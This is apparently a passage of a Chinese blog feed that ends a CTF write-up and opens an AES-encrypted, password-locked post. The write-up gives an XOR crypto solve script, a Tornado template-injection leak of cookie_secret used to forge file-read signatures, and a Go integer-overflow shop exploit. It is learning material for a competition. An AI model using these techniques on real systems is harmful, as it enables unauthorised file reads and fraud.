L^R^k0^k1^k3^k5^k6</span><br></pre></td></tr></table></figure></p><p>根据异或运算得特性<br>已知test(也就是L，R),fez(test,k)(也就是f,g)，即可通过test与fez(test,k) 进行异或运算可得出 <code>k0^k1^k3^k5^k6</code> ，<code>k1^k2^k4^k5</code><br>从而还原flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"> </span><br><span class="line">test = <span class="string">'50543fc0bca1bb4f21300f0074990f846a8009febded0b2198324c1b31d2e2563c908dcabbc461f194e70527e03a807e9a478f9a56f7'</span></span><br><span class="line">test = binascii.a2b_hex(test)</span><br><span class="line">test_k = <span class="string">'66bbd551d9847c1a10755987b43f8b214ee9c6ec2949eef01321b0bc42cffce6bdbd604924e5cbd99b7c56cf461561186921087fa1e9'</span></span><br><span class="line">test_k = binascii.a2b_hex(test_k)</span><br><span class="line">m_k = <span class="string">'44fc6f82bdd0dff9aca3e0e82cbb9d6683516524c245494b89c272a83d2b88452ec0bfa0a73ffb42e304fe3748896111b9bdf4171903'</span></span><br><span class="line">m_k = binascii.a2b_hex(m_k)</span><br><span class="line"> </span><br><span class="line">l = test[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">r = test[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">l1 = test_k[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">r1 = test_k[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">l2 = m_k[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">r2 = m_k[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line"> </span><br><span class="line">c = xor(xor(l,r),r1)</span><br><span class="line">Lr = xor(c,r2)</span><br><span class="line">d = xor(r,l1)</span><br><span class="line">R = xor(d,l2)</span><br><span class="line">L = xor(Lr,R)</span><br><span class="line">m = L+R  </span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure></p><p><a href="https://imgchr.com/i/iUP9cn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/13/iUP9cn.md.png" alt="iUP9cn.md.png"></a></p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>这里的web题目是我趁着题目还没关的时候赶紧复现的（不会做后面弄懂也是学习的方法呀23333），感谢一叶飘零学长的帮助哇。。。。</p><h4 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h4><p>这个题目上来每个选项url就很可疑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.95.5:31792/file?filename=Orz.txt&amp;signature=d227ce6c7cea5a9cd7f1721e0baace7d</span><br><span class="line"></span><br><span class="line">Orz.txt</span><br><span class="line">render() </span><br><span class="line"></span><br><span class="line">http://49.4.95.5:31792/file?filename=hint.txt&amp;signature=c7b8660e245f1360c378db1074a2a4c7</span><br><span class="line"></span><br><span class="line">hint.txt</span><br><span class="line">md5(cookie_secret + md5(filename)) </span><br><span class="line"></span><br><span class="line">http://49.4.95.5:31792/file?filename=flag.txt&amp;signature=d24b2dc1952a495057af1a898c55931b</span><br><span class="line"></span><br><span class="line">flag.txt</span><br><span class="line">/fllllllllllag</span><br></pre></td></tr></table></figure></p><p>很明显是去读文件<code>/fllllllllllag</code> ，并且要带上签名，一开始我做这个题的时候还以为强行爆破一波secret。。。还一度认为是Hash长度拓展攻击。。。。尴尬</p><p>关键点在于<code>cookie_secret</code></p><p>当我们随便输入东西的时候会出现一个报错页面<br><a href="https://imgchr.com/i/iUPn39" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPn39.md.png" alt="iUPn39.md.png"></a></p><p>这个页面过滤了很多东西，并且返回Orz</p><p>输入</p><p><code>http://49.4.95.5:31792/error?msg=</code></p><p><a href="https://imgchr.com/i/iUPucR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPucR.md.png" alt="iUPucR.md.png"></a></p><p>这里的话飘零大佬说可以进行模板注入，并且只能读一个变量<br>接下来的思路才是骚，直接阅读tornado的源码<br><code>https://github.com/tornadoweb/tornado/blob/master/tornado/auth.py</code></p><p>在<code>handler.settings</code> 里面存在<code>cookie_secret</code>这东西</p><p>读取一下</p><p><code>http://49.4.95.5:31792/error?msg=</code></p><p>注意一下，这里的两个大括号{}是起到渲染模板的作用。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Whoops, looks like somethings went wrong . </span><br><span class="line">&#123;&apos;login_url&apos;: &apos;/login&apos;, &apos;template_path&apos;: &apos;templates&apos;, &apos;xsrf_cookies&apos;: True, &apos;cookie_secret&apos;: &apos;B3&#125;r8at^62-?kGW&lt;!YJ&#123;Kl]zEZep@Nd)$H%*~9fh15.s[&gt;&amp;T+(7P4uQ0UVXDOiFb&apos;, &apos;debug&apos;: False, &apos;file_path&apos;: &apos;/www/static/files&apos;, &apos;static_path&apos;: &apos;static&apos;&#125;</span><br></pre></td></tr></table></figure><p>可以把里面的内容给读出来，以后还是得对python的MVC架构学习一下才行。。</p><p>立即构造签名<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5(<span class="string">'B3&#125;r8at^62-?kGW&lt;!YJ&#123;Kl]zEZep@Nd)$H%*~9fh15.s[&gt;&amp;T+(7P4uQ0UVXDOiFb'</span>.md5(<span class="string">'/fllllllllllag'</span>)) ;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><code>http://49.4.95.5:31792/file?filename=/fllllllllllag&amp;signature=3e9f949b7c37c999287eb096f576be00</code></p><p>得到flag<br><a href="https://imgchr.com/i/iUPKj1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPKj1.md.png" alt="iUPKj1.md.png"></a></p><h4 id="ltshop"><a href="#ltshop" class="headerlink" title="ltshop"></a>ltshop</h4><p>这个题目一开始我一直以为是前端的<code>ajax</code>的操作问题，直到看了飘零大哥的wp才知道有两种思路，一种是条件竞争，但条件竞争好像还是有上限的，开个多线程跑一下，这也是为了后面的怪异的<code>9999999</code>做铺垫,因为你没有5个以上的大辣条是换不了辣条之王的。<br><img src="https://s1.ax1x.com/2018/10/14/iUP1HK.png" alt="iUP1HK.png"><br>然后就会发现辣条数目几变成7个<br><img src="https://s1.ax1x.com/2018/10/14/iUP8AO.png" alt="iUP8AO.png"></p><p>下面才是重点，因为这里是用的是Go语言，很可能存在整数溢出，可以参考一下这篇文章<br><a href="http://www.it1352.com/808569.html" target="_blank" rel="noopener">http://www.it1352.com/808569.html</a></p><p>go语言整数溢出为<code>18446744073709551615</code>，然后可以计算<code>number=(18446744073709551615/5)+1=3689348814741910324</code>，然后我们可以直接溢出获得flag<br>下面这篇博客对于溢出过大有更深的理解:<br><a href="https://qingchenldl.github.io/2018/10/13/护网杯WP-BitPwn/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://qingchenldl.github.io/2018/10/13/护网杯WP-BitPwn/?tdsourcetag=s_pctim_aiomsg</a></p><p><a href="https://imgchr.com/i/iUPGND" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/10/14/iUPGND.md.png" alt="iUPGND.md.png"></a></p><p>还有一道题目是关于Laravel框架的解题过程，也是秀，知识点也很多，建议去看看一叶飘零学长的博客啦。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这比赛又学到了不少的东西，果然python开发出来的web框架还是自己的弱项，条件竞争这东西看来现在比赛都很流行呢，可惜自己对这方面的做题敏感度不够，以前一直认为这只有安恒的月赛才会出，以后还是得接触pwn了，继续努力。。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;护网杯的这次比赛还是很有收获的，至少在web方面我认为是这样
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CUMT平台的部分题解</title>
    <link href="0verwatch.top/CUMT-CTF-Platform.html"/>
    <id>0verwatch.top/CUMT-CTF-Platform.html</id>
    <published>2018-09-30T06:59:37.000Z</published>
    <updated>2018-10-09T07:23:35.986Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入密码</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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